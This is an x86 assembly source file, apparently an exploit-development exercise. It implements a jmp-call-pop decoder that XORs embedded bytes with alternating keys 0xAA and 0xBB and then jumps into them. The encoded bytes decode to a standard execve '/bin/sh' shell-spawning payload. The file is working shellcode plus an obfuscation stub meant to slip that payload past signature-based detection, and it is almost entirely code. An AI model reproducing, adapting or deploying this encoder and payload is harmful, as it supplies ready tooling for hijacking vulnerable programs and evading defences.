; THIS PROGRAM TAKES ENCODED SHELLCODE AND DECODES

global _start

section .text

_start:

	jmp short call_shellcode	

decoder:
	pop edi			; stores the address of the shellcode
	xor ecx , ecx		; clears ecx
	mov cl , slen		; Length of the shellcode for iteration
	
decode:
	mov ebx , ecx		; Shellcode length is passed to ebx	
	and ebx , 0x1		
	cmp ebx , 0x1        	; Condition checks for odd no
	je Odd			; jumps to Odd 
	xor byte [edi] , 0xBB   ; if even no ; xors with 0xBB

	inc edi			; moves to next shellcode byte
	loop decode		; decrements lenght of shellcode

Odd:
	xor byte [edi] , 0xAA	; xors with 0xAA
	
	inc edi			; moves to next shellcode byte
	loop decode		; decrements shellcode length
	
	jmp short Egg

call_shellcode:	
	
	call decoder

	; encoded shellcode
	
	Egg: db 0x9b,0x7b,0xfa,0xd3,0x85,0x94,0xd9,0xd3,0xc2,0x94,0xc8,0xd2,0xc4,0x32,0x49,0xeb,0x23,0x59,0xf9,0x32,0x4b,0x0b,0xa1,0x76,0x2a 			   

	slen equ 25		; shellcode length
